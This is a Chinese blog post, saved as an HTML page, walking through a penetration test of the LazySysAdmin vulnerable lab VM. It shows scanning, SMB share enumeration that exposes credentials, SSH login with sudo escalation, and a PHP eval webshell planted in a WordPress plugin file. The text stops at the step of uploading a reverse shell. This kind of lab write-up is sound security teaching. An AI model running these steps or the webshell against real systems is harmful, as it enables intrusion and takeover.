@@ -1,0 +1,1397 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言直接使用VMware打开即可，使靶机与攻击机位于同一网段即可。 渗透测试主机发现（1）netdiscover  netdiscover是基于ARP的网络扫描工具 ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以">
+<meta name="keywords" content="渗透测试,提权,vulnhub">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LazySysAdmin渗透实战">
+<meta property="og:url" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/index.html">
+<meta property="og:site_name" content="Pines404">
+<meta property="og:description" content="前言直接使用VMware打开即可，使靶机与攻击机位于同一网段即可。 渗透测试主机发现（1）netdiscover  netdiscover是基于ARP的网络扫描工具 ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cnetdiscover.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cnmap.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cenumerate.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cdirbuster1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cdirbuster2.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cwpscan_u.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cwpscan_user.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/wp1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/Samba_1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/smb_linux.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/ssh1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/WordPress_admin.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/蚁剑.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/kali.png">
+<meta property="og:updated_time" content="2019-08-10T10:15:40.946Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LazySysAdmin渗透实战">
+<meta name="twitter:description" content="前言直接使用VMware打开即可，使靶机与攻击机位于同一网段即可。 渗透测试主机发现（1）netdiscover  netdiscover是基于ARP的网络扫描工具 ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cnetdiscover.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://songxpu.github.io/2019/08/10/LazySysAdmin/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>LazySysAdmin渗透实战 | Pines404</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pines404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">穷究于理，成就于工</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">3</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">1</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">4</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/10/LazySysAdmin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">LazySysAdmin渗透实战
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-10 18:02:50 / 修改时间：18:15:40" itemprop="dateCreated datePublished" datetime="2019-08-10T18:02:50+08:00">2019-08-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">7.1k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">6 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>直接使用VMware打开即可，使靶机与攻击机位于同一网段即可。</p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p><strong>（1）netdiscover</strong></p>
+<blockquote>
+<p>netdiscover是基于ARP的网络扫描工具</p>
+<p>ARP是将IP地址转化物理地址的网络协议。通过该协议，可以判断某个IP地址是否被使用，从而发现网络中存活的主机。Kali Linux提供的netdiscover工具，就是借助该协议实施主机发现。它既可以以被动模式嗅探存活的主机，也可以以主动模式扫描主机。用户还可以根据网络稳定性，调整发包速度和数量。</p>
+</blockquote>
+<p><strong>payload</strong>:<code>netdiscover -r 192.168.64.0/24</code></p>
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cnetdiscover.png" alt="1"></p>
+<p><strong>（2）nmap</strong></p>
+<p><strong>payload</strong>:<code>nmap -sP 192.168.64.0/24</code></p>
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cnmap.png" alt="1"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><strong>payload</strong>:<code>nmap -A -oN  /root/Desktop/Lazysysadmin_info.csv 192.168.64.143</code></p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"># Nmap <span class="number">7.70</span> scan initiated Tue Jul <span class="number">30</span> <span class="number">06</span>:<span class="number">25</span>:<span class="number">24</span> <span class="number">2019</span> <span class="built_in">as</span>: nmap -A -oN /root/Desktop/Lazysysadmin_info.csv <span class="number">192.168</span><span class="number">.64</span><span class="number">.143</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.64</span><span class="number">.143</span></span><br><span class="line">Host is up (<span class="number">0.00064</span>s latency).</span><br><span class="line">Not shown: <span class="number">994</span> closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh         OpenSSH <span class="number">6.6</span><span class="number">.1</span>p1 Ubuntu <span class="number">2</span>ubuntu2<span class="number">.8</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="type">ssh</span>-hostkey: </span><br><span class="line">|   <span class="type">1024</span> b5:<span class="number">38</span>:<span class="number">66</span>:<span class="number">0</span>f:a1:ee:cd:<span class="number">41</span>:<span class="number">69</span>:<span class="number">3</span>b:<span class="number">82</span>:cf:ad:a1:f7:<span class="number">13</span> (DSA)</span><br><span class="line">|   <span class="type">2048</span> <span class="number">58</span>:<span class="number">5</span>a:<span class="number">63</span>:<span class="number">69</span>:d0:da:dd:<span class="number">51</span>:cc:c1:<span class="number">6</span>e:<span class="number">00</span>:fd:<span class="number">7</span>e:<span class="number">61</span>:d0 (RSA)</span><br><span class="line">|   <span class="type">256</span> <span class="number">61</span>:<span class="number">30</span>:f3:<span class="number">55</span>:<span class="number">1</span>a:<span class="number">0</span>d:de:c8:<span class="number">6</span>a:<span class="number">59</span>:<span class="number">5</span>b:c9:<span class="number">9</span>c:b4:<span class="number">92</span>:<span class="number">04</span> (ECDSA)</span><br><span class="line">|<span class="type">_</span>  <span class="number">256</span> <span class="number">1</span>f:<span class="number">65</span>:c0:dd:<span class="number">15</span>:e6:e4:<span class="number">21</span>:f2:c1:<span class="number">9</span>b:a3:b6:<span class="number">55</span>:a0:<span class="number">45</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   open  http        Apache httpd <span class="number">2.4</span><span class="number">.7</span> ((Ubuntu))</span><br><span class="line">|<span class="type">_http</span>-generator: Silex v2<span class="number">.2</span><span class="number">.7</span></span><br><span class="line">| <span class="type">http</span>-robots.txt: <span class="number">4</span> disallowed entries </span><br><span class="line">|<span class="type">_</span>/old/ /test/ /TR2/ /Backnode_files/</span><br><span class="line">|<span class="type">_http</span>-server-header: Apache/<span class="number">2.4</span><span class="number">.7</span> (Ubuntu)</span><br><span class="line">|<span class="type">_http</span>-title: Backnode</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios-ssn Samba smbd <span class="number">3.</span>X - <span class="number">4.</span>X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">445</span>/tcp  open  netbios-ssn Samba smbd <span class="number">4.3</span><span class="number">.11</span>-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line"><span class="number">6667</span>/tcp open  irc         InspIRCd</span><br><span class="line">| <span class="type">irc</span>-info: </span><br><span class="line">|   <span class="type">server</span>: Admin.local</span><br><span class="line">|   <span class="type">users</span>: <span class="number">1</span></span><br><span class="line">|   <span class="type">servers</span>: <span class="number">1</span></span><br><span class="line">|   <span class="type">chans</span>: <span class="number">0</span></span><br><span class="line">|   <span class="type">lusers</span>: <span class="number">1</span></span><br><span class="line">|   <span class="type">lservers</span>: <span class="number">0</span></span><br><span class="line">|   <span class="type">source</span> <span class="keyword">ident</span>: nmap</span><br><span class="line">|   <span class="type">source</span> host: <span class="number">192.168</span><span class="number">.64</span><span class="number">.131</span></span><br><span class="line">|<span class="type">_</span>  error: Closing link: (nmap@<span class="number">192.168</span><span class="number">.64</span><span class="number">.131</span>) [Client exited]</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:DE:C8:B4 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="type">4</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service <span class="keyword">Info</span>: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|<span class="type">_clock</span>-skew: mean: <span class="number">-8</span>d02h13m08s, deviation: <span class="number">5</span>h46m24s, median: <span class="number">-7</span>d22h53m09s</span><br><span class="line">|<span class="type">_nbstat</span>: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| <span class="type">smb</span>-os-discovery: </span><br><span class="line">|   <span class="type">OS</span>: Windows <span class="number">6.1</span> (Samba <span class="number">4.3</span><span class="number">.11</span>-Ubuntu)</span><br><span class="line">|   <span class="type">Computer</span> name: lazysysadmin</span><br><span class="line">|   <span class="type">NetBIOS</span> computer name: LAZYSYSADMIN\x00</span><br><span class="line">|   <span class="type">Domain</span> name: \x00</span><br><span class="line">|   <span class="type">FQDN</span>: lazysysadmin</span><br><span class="line">|<span class="type">_</span>  System <span class="built_in">time</span>: <span class="number">2019</span><span class="number">-07</span><span class="number">-22</span>T21:<span class="number">32</span>:<span class="number">29</span>+<span class="number">10</span>:<span class="number">00</span></span><br><span class="line">| <span class="type">smb</span>-security-mode: </span><br><span class="line">|   <span class="type">account_used</span>: guest</span><br><span class="line">|   <span class="type">authentication_level</span>: user</span><br><span class="line">|   <span class="type">challenge_response</span>: supported</span><br><span class="line">|<span class="type">_</span>  message_signing: disabled (dangerous, but default)</span><br><span class="line">| <span class="type">smb2</span>-security-mode: </span><br><span class="line">|   <span class="type">2</span><span class="number">.02</span>: </span><br><span class="line">|<span class="type">_</span>    Message signing enabled but not required</span><br><span class="line">| <span class="type">smb2</span>-<span class="built_in">time</span>: </span><br><span class="line">|   <span class="type">date</span>: <span class="number">2019</span><span class="number">-07</span><span class="number">-22</span> <span class="number">07</span>:<span class="number">32</span>:<span class="number">29</span></span><br><span class="line">|<span class="type">_</span>  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">0.64</span> ms <span class="number">192.168</span><span class="number">.64</span><span class="number">.143</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results <span class="built_in">at</span> https://nmap.org/submit/ .</span><br><span class="line"># Nmap done <span class="built_in">at</span> Tue Jul <span class="number">30</span> <span class="number">06</span>:<span class="number">25</span>:<span class="number">48</span> <span class="number">2019</span> -- <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="built_in">in</span> <span class="number">23.64</span> seconds</span><br></pre></td></tr></table></figure>
+
+<p>从中可看出：</p>
+<p>22端口——ssh远程登录协议</p>
+<p>80端口——http服务</p>
+<p>139端口——NETBIOS Session Service端口,用于提供文件共享服务,主要用于企业内部网之间互相访问,如文件共享或打印等等.</p>
+<p>445端口——有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机</p>
+<p>3306端口——mysql服务</p>
+<p>6667端口——一种透过网络的即时聊天方式。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。</p>
+<h4 id="enum4linux扫描"><a href="#enum4linux扫描" class="headerlink" title="enum4linux扫描"></a>enum4linux扫描</h4><blockquote>
+<p>Windows平台上曾经出现过一个第三方的信息枚举工具 enum.exe，其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。enum4linux作为其Linux平台的复刻作品，全面兼容了enum.exe的所有功能。对于安全防护不足的SMB/SAMBA服务，enum4linux可直接枚举重要信息，甚至帮助我们发现潜在漏洞的存在。</p>
+</blockquote>
+<p><strong>payload</strong>:<code>enum4linux 192.168.64.143</code></p>
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cenumerate.png" alt="1"></p>
+<p>获取到远程主机共享了print和share两个文件夹。</p>
+<h4 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h4><img src width height>
+
+<img src width height>
+
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cdirbuster1.png" alt="1"></p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cdirbuster2.png" alt="1"></p>
+<p>可看出，主要web应用有phpMyAdmin和WordPress</p>
+<h4 id="WPScan扫描"><a href="#WPScan扫描" class="headerlink" title="WPScan扫描"></a>WPScan扫描</h4><p>参考文章：<a href="https://www.freebuf.com/sectool/174663.html" target="_blank" rel="noopener">WPScan使用攻略</a></p>
+<blockquote>
+<p>采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>
+</blockquote>
+<p><strong>扫描WordPress站点</strong>:<code>wpscan -u http://192.168.64.143/wordpress/</code></p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cwpscan_u.png" alt="1"></p>
+<img src width height>
+
+<p>仅获得服务器的基本信息（PHP版本、Apache以及系统的信息），并没有其他的插件，不存在漏洞利用点。</p>
+<p><strong>枚举WordPress用户</strong>：<code>wpscan -u http://192.168.64.143/wordpress/ --enumerate u</code></p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/LazySysAdmin%5Cwpscan_user.png" alt="1"></p>
+<img src width height>
+
+<h4 id="Web站点信息"><a href="#Web站点信息" class="headerlink" title="Web站点信息"></a>Web站点信息</h4><p>（1）togie可能是什么的账户名</p>
+<p>（2）WPScan枚举出admin和ulgrmbcg两个用户名</p>
+<p><img src="//songxpu.github.io/2019/08/10/LazySysAdmin/wp1.png" alt="1"></p>
+<img src width height>
+
+<h4 id="Samba协议登录"><a href="#Samba协议登录" class="headerlink" title="Samba协议登录"></a>Samba协议登录</h4><p>由上面enumlinux扫描获取到两个共享文件夹，访问:</p>
+<p><strong>windows</strong>下:<code>\\192.168.64.143\share$</code></p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/Samba_1.png" width="700" height>
+
+<p><strong>linux</strong>下:<code>smbclient //192.168.64.143/share$</code></p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/smb_linux.png" width="700">
+
+<p>经简单审计WordPress的源码，发现信息：</p>
+<p><strong>wp-config.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'Admin'</span>);</span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'TogieMYSQL12345^^'</span>);</span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>获得数据库的用户与密码，登录phpMyAdmin发现权限受限，无法利用。</p>
+<p><strong>deets.txt</strong></p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CBF Remembering <span class="keyword">all</span> these passwords.</span><br><span class="line">Remember <span class="keyword">to</span> remove this <span class="keyword">file</span> <span class="keyword">and</span> update your password <span class="keyword">after</span> we push <span class="keyword">out</span> the server.</span><br><span class="line">Password <span class="number">12345</span></span><br></pre></td></tr></table></figure>
+
+<p>可能为某种服务的密码</p>
+<h4 id="SSH登录-方法1"><a href="#SSH登录-方法1" class="headerlink" title="SSH登录(方法1)"></a>SSH登录(方法1)</h4><p>尝试<code>ssh togie@192.168.64.143</code></p>
+<p>输入password:12345</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/ssh1.png" width="700" height>
+
+<p>togie权限很低，但是发现具有sudo权限</p>
+<blockquote>
+<p><em>sudo</em>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具</p>
+</blockquote>
+<p>输入<code>sudo su</code>，成功提权……</p>
+<h4 id="web渗透-方法2"><a href="#web渗透-方法2" class="headerlink" title="web渗透(方法2)"></a>web渗透(方法2)</h4><p>整理前面获取的信息:</p>
+<ol>
+<li>未知的密码<code>12345</code></li>
+<li>未知的用户名<code>togie</code></li>
+<li>数据库的用户名<code>Admin</code>，密码<code>TogieMYSQL12345^^</code></li>
+</ol>
+<p>（1）WordPress后台登录:<code>http://192.168.64.143/wordpress/wp-login.php</code></p>
+<p>尝试用户名<code>Admin</code>，密码<code>TogieMYSQL12345^^</code>，登录成功，进入到WordPress后台</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/WordPress_admin.png" width="700">
+
+<p>（2）点击插件-&gt;编辑-&gt;选择Hello Dolly</p>
+<blockquote>
+<p>Hello Dolly不是普通的插件，它象征着一代人希望和热情，浓缩成Louis Armstrong的四个字：你好，多莉。在启用后，在您站点后台每个页面的右上角都可以看到一句来自《俏红娘》音乐剧的英文原版台词。</p>
+</blockquote>
+<p>（3）修改hello.php文件，在末尾添加file_put_contents(‘shell.php’,’<?php eval($_POST[pass]);?>‘);</p>
+<p>在当前目录下生成webshell，蚁剑连接即可</p>
+<img src="//songxpu.github.io/2019/08/10/LazySysAdmin/蚁剑.png" width="700" height>
+
+<p>（4）上传反弹shell脚本</p>
